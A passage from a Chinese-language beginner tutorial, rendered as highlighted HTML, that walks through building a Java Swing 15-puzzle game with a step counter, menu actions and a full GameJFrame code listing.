class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; data[i].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(data[i][j] != win[i][j])&#123;</span><br><span class="line">                    <span class="comment">//只要有一个数据不一样，则返回false</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//循环结束表示数组遍历比较完毕，全都一样返回true</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="计步功能"><a class="header-anchor" href="#计步功能">¶</a>计步功能</h3>
<h4 id="业务分析-v4"><a class="header-anchor" href="#业务分析-v4">¶</a>业务分析</h4>
<ul>
<li>左上角放一个计步器，每移动一次，计步器就需要自增一次</li>
</ul>
<h4 id="实现步骤-v5"><a class="header-anchor" href="#实现步骤-v5">¶</a>实现步骤</h4>
<ol>
<li>定义一个变量用来统计已经玩了多少步。</li>
<li>每次按上下左右的时候计步器自增一次即可。</li>
</ol>
<h4 id="代码实现-v2"><a class="header-anchor" href="#代码实现-v2">¶</a>代码实现</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GameJFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> <span class="keyword">implements</span> <span class="title class_">KeyListener</span>,ActionListener&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//定义变量用来统计步数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">step</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//初始化图片</span></span><br><span class="line">    <span class="comment">//添加图片的时候，就需要按照二维数组中管理的数据添加图片</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initImage</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//清空原本已经出现的所有图片</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().removeAll();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (victory()) &#123;</span><br><span class="line">            <span class="comment">//显示胜利的图标</span></span><br><span class="line">            <span class="type">JLabel</span> <span class="variable">winJLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;C:\\Users\\moon\\IdeaProjects\\basic-code\\puzzlegame\\image\\win.png&quot;</span>));</span><br><span class="line">            winJLabel.setBounds(<span class="number">203</span>,<span class="number">283</span>,<span class="number">197</span>,<span class="number">73</span>);</span><br><span class="line">            <span class="built_in">this</span>.getContentPane().add(winJLabel);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">stepCount</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;步数：&quot;</span> + step);</span><br><span class="line">        stepCount.setBounds(<span class="number">50</span>,<span class="number">30</span>,<span class="number">100</span>,<span class="number">20</span>);</span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(stepCount);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//路径分为两种：</span></span><br><span class="line">        <span class="comment">//绝对路径：一定是从盘符开始的。C:\  D：\</span></span><br><span class="line">        <span class="comment">//相对路径：不是从盘符开始的</span></span><br><span class="line">        <span class="comment">//相对路径相对当前项目而言的。 aaa\\bbb</span></span><br><span class="line">        <span class="comment">//在当前项目下，去找aaa文件夹，里面再找bbb文件夹。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//细节：</span></span><br><span class="line">        <span class="comment">//先加载的图片在上方，后加载的图片塞在下面。</span></span><br><span class="line">        <span class="comment">//外循环 --- 把内循环重复执行了4次。</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//内循环 --- 表示在一行添加4张图片</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                <span class="comment">//获取当前要加载图片的序号</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> data[i][j];</span><br><span class="line">                <span class="comment">//创建一个JLabel的对象（管理容器）</span></span><br><span class="line">                <span class="type">JLabel</span> <span class="variable">jLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(path + num + <span class="string">&quot;.jpg&quot;</span>));</span><br><span class="line">                <span class="comment">//指定图片位置</span></span><br><span class="line">                jLabel.setBounds(<span class="number">105</span> * j + <span class="number">83</span>, <span class="number">105</span> * i + <span class="number">134</span>, <span class="number">105</span>, <span class="number">105</span>);</span><br><span class="line">                <span class="comment">//给图片添加边框</span></span><br><span class="line">                <span class="comment">//0:表示让图片凸起来</span></span><br><span class="line">                <span class="comment">//1：表示让图片凹下去</span></span><br><span class="line">                jLabel.setBorder(<span class="keyword">new</span> <span class="title class_">BevelBorder</span>(BevelBorder.LOWERED));</span><br><span class="line">                <span class="comment">//把管理容器添加到界面中</span></span><br><span class="line">                <span class="built_in">this</span>.getContentPane().add(jLabel);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加背景图片</span></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">background</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;puzzlegame\\image\\background.png&quot;</span>));</span><br><span class="line">        background.setBounds(<span class="number">40</span>, <span class="number">40</span>, <span class="number">508</span>, <span class="number">560</span>);</span><br><span class="line">        <span class="comment">//把背景图片添加到界面当中</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(background);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//刷新一下界面</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().repaint();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//松开按键的时候会调用这个方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keyReleased</span><span class="params">(KeyEvent e)</span> &#123;</span><br><span class="line">        <span class="comment">//判断游戏是否胜利，如果胜利，此方法需要直接结束，不能再执行下面的移动代码了</span></span><br><span class="line">        <span class="keyword">if</span>(victory())&#123;</span><br><span class="line">            <span class="comment">//结束方法</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对上，下，左，右进行判断</span></span><br><span class="line">        <span class="comment">//左：37 上：38 右：39 下：40</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> e.getKeyCode();</span><br><span class="line">        System.out.println(code);</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">37</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;向左移动&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(y == <span class="number">3</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//逻辑：</span></span><br><span class="line">            <span class="comment">//把空白方块右方的数字往左移动</span></span><br><span class="line">            data[x][y] = data[x][y + <span class="number">1</span>];</span><br><span class="line">            data[x][y + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">            y++;</span><br><span class="line">            <span class="comment">//每移动一次，计数器就自增一次。</span></span><br><span class="line">            step++;</span><br><span class="line">            <span class="comment">//调用方法按照最新的数字加载图片</span></span><br><span class="line">            initImage();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == <span class="number">38</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;向上移动&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(x == <span class="number">3</span>)&#123;</span><br><span class="line">                <span class="comment">//表示空白方块已经在最下方了，他的下面没有图片再能移动了</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//逻辑：</span></span><br><span class="line">            <span class="comment">//把空白方块下方的数字往上移动</span></span><br><span class="line">            <span class="comment">//x，y  表示空白方块</span></span><br><span class="line">            <span class="comment">//x + 1， y 表示空白方块下方的数字</span></span><br><span class="line">            <span class="comment">//把空白方块下方的数字赋值给空白方块</span></span><br><span class="line">            data[x][y] = data[x + <span class="number">1</span>][y];</span><br><span class="line">            data[x + <span class="number">1</span>][y] = <span class="number">0</span>;</span><br><span class="line">            x++;</span><br><span class="line">            <span class="comment">//每移动一次，计数器就自增一次。</span></span><br><span class="line">            step++;</span><br><span class="line">            <span class="comment">//调用方法按照最新的数字加载图片</span></span><br><span class="line">            initImage();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == <span class="number">39</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;向右移动&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(y == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//逻辑：</span></span><br><span class="line">            <span class="comment">//把空白方块左方的数字往右移动</span></span><br><span class="line">            data[x][y] = data[x][y - <span class="number">1</span>];</span><br><span class="line">            data[x][y - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">            y--;</span><br><span class="line">            <span class="comment">//每移动一次，计数器就自增一次。</span></span><br><span class="line">            step++;</span><br><span class="line">            <span class="comment">//调用方法按照最新的数字加载图片</span></span><br><span class="line">            initImage();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == <span class="number">40</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;向下移动&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(x == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//逻辑：</span></span><br><span class="line">            <span class="comment">//把空白方块上方的数字往下移动</span></span><br><span class="line">            data[x][y] = data[x - <span class="number">1</span>][y];</span><br><span class="line">            data[x - <span class="number">1</span>][y] = <span class="number">0</span>;</span><br><span class="line">            x--;</span><br><span class="line">            <span class="comment">//每移动一次，计数器就自增一次。</span></span><br><span class="line">            step++;</span><br><span class="line">            <span class="comment">//调用方法按照最新的数字加载图片</span></span><br><span class="line">            initImage();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="number">65</span>)&#123;</span><br><span class="line">            initImage();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="number">87</span>)&#123;</span><br><span class="line">            data = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;</span><br><span class="line">                    &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">                    &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;,</span><br><span class="line">                    &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;,</span><br><span class="line">                    &#123;<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>&#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            initImage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="其他功能"><a class="header-anchor" href="#其他功能">¶</a>其他功能</h3>
<h4 id="业务分析-v5"><a class="header-anchor" href="#业务分析-v5">¶</a>业务分析</h4>
<ul>
<li>完成重新开始、关闭游戏、关于我们。这三个都是在菜单上的，所以可以一起完成</li>
<li>重新开始：点击之后，重新打乱图片，计步器清零</li>
<li>关闭游戏：点击之后，全部关闭</li>
<li>关于我们：点击之后出现公众号二维码</li>
</ul>
<h4 id="实现步骤-v6"><a class="header-anchor" href="#实现步骤-v6">¶</a>实现步骤</h4>
<ol>
<li>给菜单上的每个选项添加点击事件</li>
<li>在actionPerformed方法中实现对应的逻辑即可</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">    <span class="comment">//获取当前被点击的条目对象</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> e.getSource();</span><br><span class="line">    <span class="comment">//判断</span></span><br><span class="line">    <span class="keyword">if</span>(obj == replayItem)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;重新游戏&quot;</span>);</span><br><span class="line">        <span class="comment">//计步器清零</span></span><br><span class="line">        step = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//再次打乱二维数组中的数据</span></span><br><span class="line">        initData();</span><br><span class="line">        <span class="comment">//重新加载图片</span></span><br><span class="line">        initImage();</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(obj == reLoginItem)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;重新登录&quot;</span>);</span><br><span class="line">        <span class="comment">//关闭当前的游戏界面</span></span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//打开登录界面</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">LoginJFrame</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(obj == closeItem)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;关闭游戏&quot;</span>);</span><br><span class="line">        <span class="comment">//直接关闭虚拟机即可</span></span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(obj == accountItem)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;公众号&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个弹框对象</span></span><br><span class="line">        <span class="type">JDialog</span> <span class="variable">jDialog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JDialog</span>();</span><br><span class="line">        <span class="comment">//创建一个管理图片的容器对象JLabel</span></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">jLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;puzzlegame\\image\\about.png&quot;</span>));</span><br><span class="line">        <span class="comment">//设置位置和宽高</span></span><br><span class="line">        jLabel.setBounds(<span class="number">0</span>,<span class="number">0</span>,<span class="number">258</span>,<span class="number">258</span>);</span><br><span class="line">        <span class="comment">//把图片添加到弹框当中</span></span><br><span class="line">        jDialog.getContentPane().add(jLabel);</span><br><span class="line">        <span class="comment">//给弹框设置大小</span></span><br><span class="line">        jDialog.setSize(<span class="number">344</span>,<span class="number">344</span>);</span><br><span class="line">        <span class="comment">//让弹框置顶</span></span><br><span class="line">        jDialog.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//让弹框居中</span></span><br><span class="line">        jDialog.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//弹框不关闭则无法操作下面的界面</span></span><br><span class="line">        jDialog.setModal(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//让弹框显示出来</span></span><br><span class="line">        jDialog.setVisible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="游戏完整代码"><a class="header-anchor" href="#游戏完整代码">¶</a>游戏完整代码</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GameJFrame</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> <span class="keyword">implements</span> <span class="title class_">KeyListener</span>,ActionListener&#123;</span><br><span class="line">    <span class="comment">//JFrame 界面，窗体</span></span><br><span class="line">    <span class="comment">//子类呢？也表示界面，窗体</span></span><br><span class="line">    <span class="comment">//规定：GameJFrame这个界面表示的就是游戏的主界面</span></span><br><span class="line">    <span class="comment">//以后跟游戏相关的所有逻辑都写在这个类中</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个二维数组</span></span><br><span class="line">    <span class="comment">//目的：用来管理数据</span></span><br><span class="line">    <span class="comment">//加载图片的时候，会根据二维数组中的数据进行加载</span></span><br><span class="line">    <span class="type">int</span>[][] data = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//记录空白方块在二维数组中的位置</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个变量，记录当前展示图片的路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;puzzlegame\\image\\animal\\animal3\\&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个二维数组，存储正确的数据</span></span><br><span class="line">    <span class="type">int</span>[][] win = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;,</span><br><span class="line">        &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;,</span><br><span class="line">        &#123;<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义变量用来统计步数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">step</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建选项下面的条目对象</span></span><br><span class="line">    <span class="type">JMenuItem</span> <span class="variable">replayItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;重新游戏&quot;</span>);</span><br><span class="line">    <span class="type">JMenuItem</span> <span class="variable">reLoginItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;重新登录&quot;</span>);</span><br><span class="line">    <span class="type">JMenuItem</span> <span class="variable">closeItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;关闭游戏&quot;</span>);</span><br><span class="line">    <span class="type">JMenuItem</span> <span class="variable">accountItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuItem</span>(<span class="string">&quot;公众号&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GameJFrame</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//初始化界面</span></span><br><span class="line">        initJFrame();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化菜单</span></span><br><span class="line">        initJMenuBar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化数据（打乱）</span></span><br><span class="line">        initData();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化图片（根据打乱之后的结果去加载图片）</span></span><br><span class="line">        initImage();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//让界面显示出来，建议写在最后</span></span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化数据（打乱）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1.定义一个一维数组</span></span><br><span class="line">        <span class="type">int</span>[] tempArr = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>&#125;;</span><br><span class="line">        <span class="comment">//2.打乱数组中的数据的顺序</span></span><br><span class="line">        <span class="comment">//遍历数组，得到每一个元素，拿着每一个元素跟随机索引上的数据进行交换</span></span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tempArr.length; i++) &#123;</span><br><span class="line">            <span class="comment">//获取到随机索引</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> r.nextInt(tempArr.length);</span><br><span class="line">            <span class="comment">//拿着遍历到的每一个数据，跟随机索引上的数据进行交换</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> tempArr[i];</span><br><span class="line">            tempArr[i] = tempArr[index];</span><br><span class="line">            tempArr[index] = temp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        *           5   6   8   9</span></span><br><span class="line"><span class="comment">        *           10  11  15  1</span></span><br><span class="line"><span class="comment">        *           4   7   12  13</span></span><br><span class="line"><span class="comment">        *           2   3   0  14</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        *           5   6   8   9   10  11  15  1   4   7   12  13  2   3   0   14</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.给二维数组添加数据</span></span><br><span class="line">        <span class="comment">//遍历一维数组tempArr得到每一个元素，把每一个元素依次添加到二维数组当中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tempArr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tempArr[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                x = i / <span class="number">4</span>;</span><br><span class="line">                y = i % <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            data[i / <span class="number">4</span>][i % <span class="number">4</span>] = tempArr[i];  <span class="comment">// 这行是把一维数组的数据分配到二维数组的指定位置去</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化图片</span></span><br><span class="line">    <span class="comment">//添加图片的时候，就需要按照二维数组中管理的数据添加图片</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initImage</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//清空原本已经出现的所有图片</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().removeAll();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (victory()) &#123;</span><br><span class="line">            <span class="comment">//显示胜利的图标</span></span><br><span class="line">            <span class="type">JLabel</span> <span class="variable">winJLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;C:\\Users\\moon\\IdeaProjects\\basic-code\\puzzlegame\\image\\win.png&quot;</span>));</span><br><span class="line">            winJLabel.setBounds(<span class="number">203</span>,<span class="number">283</span>,<span class="number">197</span>,<span class="number">73</span>);</span><br><span class="line">            <span class="built_in">this</span>.getContentPane().add(winJLabel);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">stepCount</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;步数：&quot;</span> + step);</span><br><span class="line">        stepCount.setBounds(<span class="number">50</span>,<span class="number">30</span>,<span class="number">100</span>,<span class="number">20</span>);</span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(stepCount);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//路径分为两种：</span></span><br><span class="line">        <span class="comment">//绝对路径：一定是从盘符开始的。C:\  D：\</span></span><br><span class="line">        <span class="comment">//相对路径：不是从盘符开始的</span></span><br><span class="line">        <span class="comment">//相对路径相对当前项目而言的。 aaa\\bbb</span></span><br><span class="line">        <span class="comment">//在当前项目下，去找aaa文件夹，里面再找bbb文件夹。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//细节：</span></span><br><span class="line">        <span class="comment">//先加载的图片在上方，后加载的图片塞在下面。</span></span><br><span class="line">        <span class="comment">//外循环 --- 把内循环重复执行了4次。</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//内循环 --- 表示在一行添加4张图片</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                <span class="comment">//获取当前要加载图片的序号</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> data[i][j];</span><br><span class="line">                <span class="comment">//创建一个JLabel的对象（管理容器）</span></span><br><span class="line">                <span class="type">JLabel</span> <span class="variable">jLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(path + num + <span class="string">&quot;.jpg&quot;</span>));</span><br><span class="line">                <span class="comment">//指定图片位置</span></span><br><span class="line">                jLabel.setBounds(<span class="number">105</span> * j + <span class="number">83</span>, <span class="number">105</span> * i + <span class="number">134</span>, <span class="number">105</span>, <span class="number">105</span>);</span><br><span class="line">                <span class="comment">//给图片添加边框</span></span><br><span class="line">                <span class="comment">//0:表示让图片凸起来</span></span><br><span class="line">                <span class="comment">//1：表示让图片凹下去</span></span><br><span class="line">                jLabel.setBorder(<span class="keyword">new</span> <span class="title class_">BevelBorder</span>(BevelBorder.LOWERED));</span><br><span class="line">                <span class="comment">//把管理容器添加到界面中</span></span><br><span class="line">                <span class="built_in">this</span>.getContentPane().add(jLabel);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加背景图片</span></span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">background</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;puzzlegame\\image\\background.png&quot;</span>));</span><br><span class="line">        background.setBounds(<span class="number">40</span>, <span class="number">40</span>, <span class="number">508</span>, <span class="number">560</span>);</span><br><span class="line">        <span class="comment">//把背景图片添加到界面当中</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().add(background);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//刷新一下界面</span></span><br><span class="line">        <span class="built_in">this</span>.getContentPane().repaint();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initJMenuBar</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//创建整个的菜单对象</span></span><br><span class="line">        <span class="type">JMenuBar</span> <span class="variable">jMenuBar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenuBar</span>();</span><br><span class="line">        <span class="comment">//创建菜单上面的两个选项的对象 （功能  关于我们）</span></span><br><span class="line">        <span class="type">JMenu</span> <span class="variable">functionJMenu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;功能&quot;</span>);</span><br><span class="line">        <span class="type">JMenu</span> <span class="variable">aboutJMenu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMenu</span>(<span class="string">&quot;关于我们&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将每一个选项下面的条目添加到选项当中</span></span><br><span class="line">        functionJMenu.add(replayItem);</span><br><span class="line">        functionJMenu.add(reLoginItem);</span><br><span class="line">        functionJMenu.add(closeItem);</span><br><span class="line"></span><br><span class="line">        aboutJMenu.add(accountItem);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//给条目绑定事件</span></span><br><span class="line">        replayItem.addActionListener(<span class="built_in">this</span>);</span><br><span class="line">        reLoginItem.addActionListener(<span class="built_in">this</span>);</span><br><span class="line">        closeItem.addActionListener(<span class="built_in">this</span>);</span><br><span class="line">        accountItem.addActionListener(<span class="built_in">this</span>);</span><br><span 